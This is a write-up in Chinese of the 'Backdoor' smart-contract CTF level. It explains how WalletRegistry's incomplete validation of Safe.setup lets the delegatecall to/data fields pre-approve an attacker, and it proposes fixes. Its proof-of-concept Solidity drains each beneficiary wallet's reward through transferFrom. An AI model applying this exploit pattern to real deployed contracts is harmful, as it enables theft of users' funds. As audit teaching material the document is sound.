# Backdoor 漏洞分析

## 1. 合约功能概述

`WalletRegistry` 的目标是：为白名单用户登记其 Safe 钱包，并在登记成功时向该钱包发放 10 DVT 奖励。

**核心组件：**
- **WalletRegistry.sol**: Safe 注册与奖励发放逻辑
- **Safe / SafeProxyFactory**: 用户钱包创建基础设施
- **Backdoor.t.sol**: 4 个受益人（Alice/Bob/Charlie/David），总奖励 40 DVT

**业务流程：**
1. 受益人通过 `SafeProxyFactory.createProxyWithCallback` 创建 Safe
2. `WalletRegistry.proxyCreated` 回调校验钱包参数
3. 校验通过后，注册 `wallets[owner]` 并发放 10 DVT 到该 Safe

---

## 2. 漏洞位置

### 漏洞代码（WalletRegistry.sol）

```solidity
// 只检查 initializer 的 selector 是 Safe.setup
if (bytes4(initializer[:4]) != Safe.setup.selector) {
    revert InvalidInitialization();
}

// 只检查 threshold / owners / fallbackManager
uint256 threshold = Safe(walletAddress).getThreshold();
address[] memory owners = Safe(walletAddress).getOwners();
address fallbackManager = _getFallbackManager(walletAddress);
```

### 漏洞本质

`Safe.setup` 有关键参数 `to` 和 `data`，会在初始化中执行一次 `delegatecall`（`setupModules(to, data)`）。

Registry 没有限制这两个参数，导致攻击者可以：

- 创建“看起来完全合法”的 1/1 受益人 Safe
- 但在 setup 阶段偷偷执行恶意逻辑（例如给攻击者预授权 token）
- Registry 发奖励后，攻击者立刻 `transferFrom` 把奖励转走

---

## 3. 漏洞原理分析

### 3.1 为什么严格校验仍会失守

Registry 的校验集中在“表面配置”：
- factory 是否正确
- singleton 是否正确
- owners 数量是否为 1
- threshold 是否为 1
- fallbackManager 是否为 0

这些都能被攻击者满足。

真正的问题在于：
- **初始化行为可扩展**（`to + data`）
- Registry 没有约束初始化期间执行了什么代码

### 3.2 攻击链条

1. 对每个受益人构造 `Safe.setup` 初始化数据
2. 将 `to` 指向攻击者控制的 helper 合约，`data` 指向 `approveToken(token, attacker)`
3. `createProxyWithCallback` 触发 Registry 回调并发放 10 DVT 到新 Safe
4. 攻击者用预授权 `transferFrom(wallet, recovery, 10e18)` 提走奖励
5. 对 4 个受益人重复，共取走 40 DVT

### 3.3 `approve` 是如何被运行的（关键细节）

很多人第一次看会困惑：为什么只是把 `to/data` 填进 `Safe.setup`，就能让 Safe 自己去 `approve`？

核心在 Safe 的初始化流程里有一次 **delegatecall**：

1. `SafeProxyFactory.createProxyWithCallback(singleton, initializer, ...)`
2. 工厂部署 proxy 后，会对新 proxy 执行 `initializer`（也就是 `Safe.setup(...)`）
3. `Safe.setup` 内部调用 `setupModules(to, data)`
4. `setupModules` 会对 `to` 执行 `delegatecall(data)`

由于是 delegatecall：

- 运行的是 helper 合约的代码
- 但执行上下文（`address(this)`、storage、msg.sender 的语义）属于 **Safe 钱包本身**

因此 helper 里的 `token.approve(spender, ...)` 实际效果等价于：

```solidity
// 逻辑上等价：是 wallet(Safe) 自己在给 attacker 授权
token.approve(attacker, type(uint256).max);
```

一旦 Registry 把奖励 token 打到 wallet，攻击者就可以立刻用这份授权把 token `transferFrom` 走。

### 3.4 关卡约束如何满足

测试要求玩家只执行一笔交易：

```solidity
assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
```

解法通过“玩家仅部署一次攻击合约，在构造函数内完成全部流程”满足该约束。

---

## 4. 修复方案

### 方案一：强约束 `initializer` 参数（推荐）

在回调里解码 `Safe.setup` 参数，强制：

- `to == address(0)`
- `data.length == 0`
- `payment == 0`
- `paymentToken == address(0)`

这样可阻断 setup 阶段的任意初始化执行。

### 方案二：由 Registry 主动组装 initializer

不要信任外部传入 initializer；改为 Registry 内部固定模板并发起钱包创建。

### 方案三：奖励延迟领取 + 用户签名确认

奖励不在 `proxyCreated` 自动转账，而是由钱包 owner 后续签名领取，降低初始化后门风险。

---

## 5. Proof of Concept（关键代码）

```solidity
bytes memory approvalData = abi.encodeCall(helper.approveToken, (address(token), address(this)));

bytes memory initializer = abi.encodeCall(
    Safe.setup,
    (
        owners,                 // 受益人作为唯一 owner（满足 Registry 校验）
        1,                      // threshold = 1
        address(helper),        // ⚠️ setup 阶段 delegatecall 目标
        approvalData,           // ⚠️ 在 Safe 上下文执行 token.approve(attacker)
        address(0),
        address(0),
        0,
        payable(address(0))
    )
);

address wallet = address(walletFactory.createProxyWithCallback(
    address(singletonCopy),
    initializer,
    i,
    walletRegistry
));

// Registry 给 wallet 发 10 DVT 后，攻击者凭预授权立即转走
token.transferFrom(wallet, recovery, 10 ether);
```

---

## 6. 总结

`Backdoor` 的关键教训是：

- **“参数看起来合法” ≠ “初始化过程安全”**
- 在可插拔初始化体系（如 Safe setup）中，`to/data` 往往是最高风险入口

审计此类合约时，要把“回调时状态校验”扩展为“初始化期间行为约束”，否则很容易出现后门式授权漏洞。
